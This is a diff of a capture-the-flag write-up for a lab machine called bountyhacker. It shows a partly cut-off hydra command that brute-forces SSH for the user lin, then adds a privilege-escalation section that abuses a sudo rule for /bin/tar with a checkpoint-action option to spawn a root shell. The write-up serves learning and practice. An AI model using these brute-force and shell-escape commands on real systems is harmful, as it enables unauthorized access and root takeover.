@@ -73,8 +73,26 @@ Used locks.txt file to brute force ssh by using this command - ``` hydra -l lin 
 
 ![image](https://github.com/user-attachments/assets/b822493c-cb95-4544-8c0b-5b1c18b38486)
 
-Successfully logged into SSH
+Successfully logged into SSH and got the user.txt flag
 
 ![image](https://github.com/user-attachments/assets/35e53d7a-c3c2-4a78-80e8-d99df17ee26d)
+
+## Privilege Escalation
+
+Found lin's permissions -
+``` 
+lin@bountyhacker:/$ sudo -l
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+```
+
+To get elevated permissions to root I used this command - ``` sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh ```
+
+
+reference - https://gtfobins.github.io/gtfobins/tar/#sudo
+
+![image](https://github.com/user-attachments/assets/a91470bb-8a99-45c2-aa8c-08f4518b42f6)
+
+
 
 
